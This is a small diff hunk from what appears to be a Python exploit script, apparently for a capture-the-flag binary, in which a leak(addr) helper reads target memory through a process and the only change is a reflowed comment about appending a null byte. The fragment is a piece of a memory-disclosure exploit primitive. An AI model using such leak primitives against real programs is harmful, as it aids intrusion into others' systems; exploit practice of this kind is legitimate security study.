@@ -35,8 +35,8 @@ def leak(addr):
     
     p.recvuntil("BB")
 
-    data = p.recvuntil("CC")[:-2] + "\x00" #must adding \x00, becuase must leaking at least one byte data, however addr may be null
-    #print len(data)
+    data = p.recvuntil("CC")[:-2] + "\x00" #must adding \x00, becuase must leaking at least one byte data, 
+    #print len(data)			   #however addr's content may be empty.
     remove(0)
     return data
 
